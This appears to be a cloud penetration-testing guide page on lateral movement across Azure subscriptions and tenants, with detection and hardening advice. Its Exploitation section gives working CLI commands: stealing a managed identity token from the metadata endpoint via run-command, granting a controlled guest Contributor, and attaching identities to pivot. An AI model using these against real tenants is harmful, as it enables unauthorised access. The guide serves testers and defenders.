---
cstg_id: CSTG-AZURE-SUBSCRIPTIONS-LATERAL
title: "AZURE Subscriptions - Lateral Movement"
provider: azure
service: subscriptions
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - "Microsoft.Resources/subscriptions/read"
  - "Microsoft.Management/managementGroups/read"
  - "Microsoft.Authorization/roleAssignments/read"
  - "Microsoft.Authorization/roleAssignments/write"
  - "Microsoft.ManagedServices/registrationAssignments/read"
  - "Microsoft.Resources/deployments/write"
  - "Microsoft.Compute/virtualMachines/runCommand/action"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action"
references:
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/scope-overview"
  - "https://learn.microsoft.com/en-us/azure/governance/management-groups/overview"
  - "https://learn.microsoft.com/en-us/azure/lighthouse/concepts/cross-tenant-management-experience"
  - "https://learn.microsoft.com/en-us/azure/active-directory/external-identities/b2b-fundamentals"
  - "https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview"
  - "https://learn.microsoft.com/en-us/azure/governance/resource-graph/overview"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

This page covers **lateral movement** at and across the Azure subscription layer: how an attacker who controls one principal in one subscription expands sideways to other resources, other subscriptions, other management groups, and other tenants. Where the privilege-escalation phase is about gaining *more* rights, lateral movement is about *reaching new scopes and resources* at roughly the same privilege level, using the connective tissue of the Azure scope hierarchy, shared identities, and cross-tenant delegation.

Subscription-layer lateral movement follows several recurring channels: (1) **scope inheritance** — a principal holding a role at a management group already reaches every subscription beneath it, so "movement" is simply enumeration plus token use; (2) **shared identities** — a service principal or managed identity assigned roles in multiple subscriptions lets a foothold in one become access to all; (3) **cross-tenant relationships** — Azure Lighthouse delegations and Entra B2B guest accounts bridge subscriptions in *different* tenants; and (4) **resource-mediated pivots** — using compute the attacker controls in one subscription to mint tokens or reach resources in another. Each channel is detailed below.

The within-subscription identity-borrowing primitives (run-command, managed-identity token theft) are detailed in [azure-managed-identities-lateral.md](azure-managed-identities-lateral.md) and [azure-rbac-privesc.md](../03-privilege-escalation/azure-rbac-privesc.md); this page focuses on how those primitives carry an attacker *between* subscriptions and tenants. Enumeration that reveals the cross-scope topology is in [azure-subscriptions-enum.md](../02-services/azure-subscriptions-enum.md).

## Prerequisites

An authenticated foothold in at least one subscription as a principal that holds some access elsewhere, or that can reach a resource/identity carrying access elsewhere. A valid ARM token (interactive, service-principal, managed-identity, or Cloud Shell). The essential first step is to enumerate **every scope the current identity can already touch** — lateral movement frequently requires no new privilege at all, only awareness that the held role spans more than the current subscription:

```bash
az account list --all -o table                # subscriptions reachable across all tenants
az account tenant list -o table               # other tenants this identity can sign into
az role assignment list --assignee <objectId> --all -o json   # every scope where it holds a role
```

## Enumeration

### Map the principal's full reach across scopes and tenants

```bash
# Subscriptions the principal can read in EVERY tenant it can authenticate to
az account list --all --query "[].{name:name, id:id, tenant:tenantId, state:state}" -o json

# Role assignments for this principal anywhere (reveals MG/sub scopes beyond current)
az role assignment list --assignee <objectId> --all \
  --query "[].{role:roleDefinitionName, scope:scope}" -o json
```

### Discover shared service principals and managed identities across subscriptions

A workload identity assigned roles in several subscriptions is a ready-made bridge. Resource Graph finds them in one query:

```bash
az graph query -q "authorizationresources
| where type == 'microsoft.authorization/roleassignments'
| extend principalId = tostring(properties.principalId),
         principalType = tostring(properties.principalType),
         scope = tostring(properties.scope)
| where principalType in ('ServicePrincipal','ManagedIdentity')
| summarize scopes = make_set(scope), subs = dcount(subscriptionId) by principalId
| where subs > 1
| order by subs desc"
```

### Discover cross-tenant bridges (Lighthouse and guests)

```bash
# Lighthouse delegations the current subscription participates in (in either direction)
az rest --method get --url \
  "https://management.azure.com/subscriptions/<subId>/providers/Microsoft.ManagedServices/registrationAssignments?api-version=2022-10-01&\$expand=registrationDefinition"

# B2B guest accounts in the directory (cross-org identities)
az rest --method get --url \
  "https://graph.microsoft.com/v1.0/users?\$filter=userType eq 'Guest'&\$select=id,userPrincipalName,mail"
```

### Identify resource-mediated pivots

```bash
# VMs/Functions/Automation in reach whose managed identity holds roles in OTHER subscriptions
az resource list --resource-type Microsoft.Compute/virtualMachines -o json
# cross-reference each resource's identity principalId against role assignments enumerated above
```

## Misconfigurations & Findings

- **Management-group-scoped roles** that the attacker already holds — the entire subtree of subscriptions is reachable with the current token; no new credential is needed.
- **Shared service principals / managed identities** assigned across multiple subscriptions (CI/CD identities, platform automation). Compromise of one foothold that can borrow such an identity yields all the subscriptions it can reach.
- **Azure Lighthouse delegations** linking the subscription to another tenant. If the attacker is in the managing tenant, they reach the managed subscription; if in the managed tenant and able to read delegations, they learn of a trusted external tenant to target.
- **Entra B2B guest accounts** with role assignments in resources — a compromised guest is a foothold sourced from another organization, and a guest the attacker controls can be granted resource roles to bridge tenants.
- **Cross-subscription network/peering and shared Key Vaults** that let a resource in one subscription read secrets or reach services in another.
- **Disabled/forgotten subscriptions** still reachable from the same management group, useful as low-scrutiny staging ground.

## Exploitation

### Inherited reach via management-group scope

When the compromised principal already holds a role (even Reader/Contributor) at a management group, every child subscription is immediately reachable with the *same* token. "Movement" is operational, not privilege-gaining:

```bash
az account set --subscription <otherChildSubId>   # same token, new subscription
az resource list -o table                         # now operating in the new subscription
```

For write-capable roles at MG scope, the attacker can additionally seed access into specific children, e.g. assign itself a role on a target subscription it had not previously touched.

### Pivot through a shared workload identity

A managed identity or service principal with assignments in multiple subscriptions is the most common cross-subscription bridge. From a foothold where the attacker can execute code as that identity (a VM/Function it carries, or run-command on such a VM), it mints the identity's ARM token and then operates in *every* subscription the identity is entitled to:

```bash
# Execute on a VM carrying the shared identity to mint its ARM token
az vm run-command invoke --name <vm> --resource-group <rg> \
  --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"

# With the stolen token, enumerate and act in the other subscriptions it can reach
az account list --all -o table
```

### Cross-tenant movement via Azure Lighthouse

A Lighthouse registration assignment grants a **managing tenant** RBAC over a **managed subscription** in another tenant. An attacker established in (or controlling a principal in) the managing tenant can operate directly against the managed subscription, crossing the organizational boundary while the managed tenant sees only "delegated" activity:

```bash
# From the managing tenant context, the managed subscription appears in the list:
az account list --all -o table
az account set --subscription <managedSubInOtherTenant>
az resource list -o table
```

If the attacker instead controls write on the source subscription, creating a new delegation to an attacker tenant is both lateral reach and persistence — see [azure-subscriptions-persistence.md](../06-persistence/azure-subscriptions-persistence.md).

### Cross-tenant movement via B2B guest identities

A guest (B2B) account the attacker controls can be **granted Azure RBAC roles** in the target tenant's subscriptions, bridging access from the attacker's home tenant. Conversely, compromising an existing guest provides a foothold sourced from a partner organization.

```bash
# A principal with roleAssignments/write grants a controlled guest a role on a subscription
az role assignment create --assignee <guest-objectId> --role "Contributor" --scope /subscriptions/<subId>
```

### Borrowing a more privileged identity to reach new scopes

Where the foothold can attach a user-assigned managed identity (`.../assign/action`) that holds roles in another subscription, it attaches that identity to a resource it controls, mints its token, and reaches the new subscription — combining identity-borrowing with cross-subscription reach.

```bash
az vm identity assign --name <vm> --resource-group <rg> --identities <uami-with-other-sub-roles>
```

## Detection & Logging

- **Azure Activity Logs** in each subscription record the *use* of access there — resource reads/writes, run-command execution, identity assignment, and role assignments created to bridge access. A workload identity (service principal / managed identity) suddenly operating in a subscription it has never touched, or one principal acting across many subscriptions in a short window, is a strong lateral-movement signal.
- **Microsoft Entra ID sign-in logs** reveal cross-tenant authentication and the use of guest identities; a single identity signing into multiple tenants, or guest sign-ins from unusual locations, are notable. **Entra audit logs** record guest invitation/redemption and any directory changes used to bridge tenants.
- **Lighthouse-mediated activity** in the managed subscription is attributable to managing-tenant principals; correlate foreign tenant object IDs performing operations.
- Managed-identity token requests to `169.254.169.254` are not logged directly, but the subsequent cross-subscription ARM writes are captured under the identity's object ID.
- Managed detections: **Microsoft Defender for Cloud** and **Microsoft Sentinel** provide analytics for impossible-travel/cross-tenant access, unusual cross-subscription activity by a single identity, and new role assignments to guests.

## Remediation & Hardening

- Scope workload identities to a **single subscription/resource group** where possible; avoid one service principal or managed identity with assignments spanning many subscriptions. Audit and split multi-subscription identities.
- Govern the **management-group hierarchy** so that a role at one MG does not unintentionally span unrelated subscriptions; separate workloads into distinct branches.
- Tightly control **Azure Lighthouse**: restrict who can create delegations, review existing delegations and their managing tenants regularly, and alert on activity by foreign-tenant principals.
- Govern **B2B guests** with access reviews, restrict guest invitation, limit what guests can be assigned, and apply Conditional Access (MFA, device compliance) to external identities.
- Restrict and monitor **run-command, extension write, and managed-identity assignment** as cross-subscription pivot primitives.
- Enable **diagnostic settings on every subscription** (including disabled/forgotten ones) and centralize Activity, Entra audit, and sign-in logs to Sentinel with cross-subscription and cross-tenant correlation rules.

## Tools

- **Azure CLI / Azure PowerShell** for cross-subscription context switching, role enumeration, run-command, and identity operations.
- **Azure Resource Graph** to find shared workload identities and inventory reach across all subscriptions in one query.
- **Microsoft Graph API** for guest-account enumeration and cross-tenant identity analysis.
- **ARM REST client** for Lighthouse registration-assignment enumeration.
- **Instance Metadata Service / App Service identity endpoint** clients for minting managed-identity tokens during resource-mediated pivots.
- **Effective-access graph tooling** that joins principals to every scope they reach, surfacing multi-subscription and cross-tenant bridges.

## References

- RBAC scope overview — https://learn.microsoft.com/en-us/azure/role-based-access-control/scope-overview
- Management groups overview — https://learn.microsoft.com/en-us/azure/governance/management-groups/overview
- Lighthouse cross-tenant management — https://learn.microsoft.com/en-us/azure/lighthouse/concepts/cross-tenant-management-experience
- Entra B2B fundamentals — https://learn.microsoft.com/en-us/azure/active-directory/external-identities/b2b-fundamentals
- Managed identities overview — https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
- Azure Resource Graph — https://learn.microsoft.com/en-us/azure/governance/resource-graph/overview
- hackingthe.cloud (Azure) — https://hackingthe.cloud/azure/
